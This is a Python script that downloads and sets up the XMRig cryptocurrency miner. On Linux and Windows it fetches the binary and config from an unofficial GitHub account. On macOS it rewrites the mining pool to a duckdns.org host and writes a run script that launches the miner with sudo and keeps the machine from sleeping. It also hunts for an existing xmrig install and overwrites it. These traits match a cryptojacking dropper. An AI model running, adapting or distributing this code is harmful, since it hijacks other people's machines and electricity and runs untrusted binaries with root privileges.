#!/usr/bin/env python3
import os
import sys
import platform
import urllib.request
import tarfile
import json
from urllib.parse import urlparse

DOWNLOADS = {
    "linux": {
        "binary": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/xmrig",
        "config": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/config.json",
    },
    "windows": {
        "binary": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/xmrig.exe",
        "config": "https://github.com/xn2UEPYak4R8/xmrigHelp/releases/download/test/config.json",
    },
    "darwin": {
        "tar": "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-macos-x64.tar.gz",
    }
}

def die(msg):
    print(f"Error: {msg}", file=sys.stderr)
    sys.exit(1)

def validate_input():
    if len(sys.argv) != 2:
        die("Usage: python3 script.py <directory>")
    path = os.path.abspath(sys.argv[1])
    if not os.path.isdir(path):
        die(f"Provided argument is not a directory: {path}")
    return path

def download(url, dest):
    filename = os.path.basename(urlparse(url).path)
    dest_path = os.path.join(dest, filename)
    print(f"[+] Downloading {filename} to {dest}...")
    urllib.request.urlretrieve(url, dest_path)
    print(f"[+] Download complete: {dest_path}")
    return dest_path

def extract_tar_gz(filepath, dest):
    print(f"[+] Extracting {filepath} to {dest}...")
    with tarfile.open(filepath, "r:gz") as tf:
        tf.extractall(dest)
    os.remove(filepath)
    print("[+] Extraction complete.")

def update_config_json(config_path):
    if not os.path.exists(config_path):
        print("[!] config.json not found, skipping update.")
        return
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        if 'pools' in config and isinstance(config['pools'], list) and config['pools']:
            pool = config['pools'][0]
            pool['url'] = "ontcfu.duckdns.org:443"
            pool['tls'] = True
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
        print("[+] config.json updated.")
    except Exception as e:
        print(f"[!] Failed to update config.json: {e}")

def generate_run_script(extracted_dir):
    xmrig_binary = next(
        (os.path.join(extracted_dir, f) for f in os.listdir(extracted_dir) if f.startswith("xmrig")),
        None
    )
    if not xmrig_binary:
        print("[!] Could not find xmrig binary for run script.")
        return
    run_sh_path = os.path.join(extracted_dir, "run.sh")
    content = f"""#!/bin/bash
# Prevent sleep, run xmrig with sudo for full permissions
sudo caffeinate -i "{xmrig_binary}" --config="{os.path.join(extracted_dir, 'config.json')}"
"""
    with open(run_sh_path, "w", encoding="utf-8") as f:
        f.write(content)
    os.chmod(run_sh_path, 0o755)
    print(f"[+] run.sh script generated at {run_sh_path}")

def find_existing_xmrig(path):
    print(f"[+] Searching recursively in {path} for existing xmrig...")
    for root, dirs, files in os.walk(path):
        for f in files:
            if f.lower() in ("xmrig", "xmrig.exe"):
                found_path = os.path.abspath(root)
                print(f"[+] Found existing xmrig in: {found_path}")
                return found_path
    print("[+] No existing xmrig found.")
    return None

def main():
    dest_dir = validate_input()
    os_name = platform.system().lower()

    if os_name not in DOWNLOADS:
        die(f"Unsupported OS: {os_name}")

    target_dir = find_existing_xmrig(dest_dir) or dest_dir

    if os_name in ("linux", "windows"):
        binary_url = DOWNLOADS[os_name]["binary"]
        config_url = DOWNLOADS[os_name]["config"]
        print(f"[+] Installing/updating XMRig in {target_dir}")
        download(binary_url, target_dir)
        download(config_url, target_dir)
        print(f"[+] XMRig setup complete in {target_dir}")

    elif os_name == "darwin":
        tar_url = DOWNLOADS[os_name]["tar"]
        tar_path = download(tar_url, dest_dir)
        extract_tar_gz(tar_path, dest_dir)
        extracted_dir = next(
            (os.path.join(dest_dir, d) for d in os.listdir(dest_dir) if d.startswith("xmrig-")),
            None
        )
        if extracted_dir:
            config_path = os.path.join(extracted_dir, "config.json")
            update_config_json(config_path)
            generate_run_script(extracted_dir)
            print(f"[+] XMRig setup complete in {extracted_dir}")
        else:
            print("[!] Failed to find extracted XMRig directory.")

if __name__ == "__main__":
    main()
